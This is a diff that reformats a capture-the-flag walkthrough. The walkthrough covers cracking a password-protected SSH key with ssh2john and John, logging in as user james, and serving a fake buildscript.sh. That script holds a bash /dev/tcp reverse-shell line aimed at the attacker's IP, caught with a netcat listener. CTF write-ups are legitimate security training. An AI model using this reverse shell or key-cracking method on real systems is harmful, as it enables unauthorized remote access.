@@ -82,15 +82,11 @@ okay so name of the person is james and ... we have the ssh private key printed 
 
 `❯ ssh -i key james@BOX_IP`
 
-key: the rsa key
+- key: the rsa key
+- james: the username
+- BOX_IP: IP address of the box.
 
-james: the username
-
-BOX_IP: IP address of the box.
-
-password protected ;-;
-
-ok so lets take that key and convert it into a better format.
+password protected ;-; ok so lets take that key and convert it into a better format.
 
 `python ssh2john.py id_rsa > id_rsa.hash`
 
@@ -111,7 +107,7 @@ Warning: Only 2 candidates left, minimum 4 needed for performance.
 1g 0:00:00:07 DONE (2021-02-02 23:49) 0.1385g/s 1986Kp/s 1986Kc/s 1986KC/sa6_123..*7¡Vamos!
 Session completed
 ```
-( key hidden :) )
+key hidden :)
 
 
 ### Hack the machine and get the flag in user.txt 
@@ -196,23 +192,24 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 note the port 80 since that curl is going to look in the default port. Now, wherever you started this server, from this location onwards, we need to have this exact structure `/downloads/src/buildscript.sh`, so
 
-`❯ mkdir downloads`
-`❯ cd downloads`
-`❯ mkdir src`
-`❯ cd src`
-`❯ echo "bash -i >& /dev/tcp/MY_IP/4242 0>&1" > buildscript.sh`
+- `❯ mkdir downloads`
+- `❯ cd downloads`
+- `❯ mkdir src`
+- `❯ cd src`
+- `❯ echo "bash -i >& /dev/tcp/MY_IP/4242 0>&1" > buildscript.sh`
 
 this lets us pretend to be a server, serving that `buildscript.sh` file :)
 
 we are telling the sever to send us a tcp connection to our own ip on the port `4242`.
 
 Meanwhile, setup netcat using:
+
 `❯ nc -nlvp 4242`
 
--l: listen mode, for inbound connects
--n: numeric-only IP addresses, no DNS
--v: verbose [use twice to be more verbose]
--p port: local port number
+- -l: listen mode, for inbound connects
+- -n: numeric-only IP addresses, no DNS
+- -v: verbose [use twice to be more verbose]
+- -p port: local port number
 
 and we are in!
 
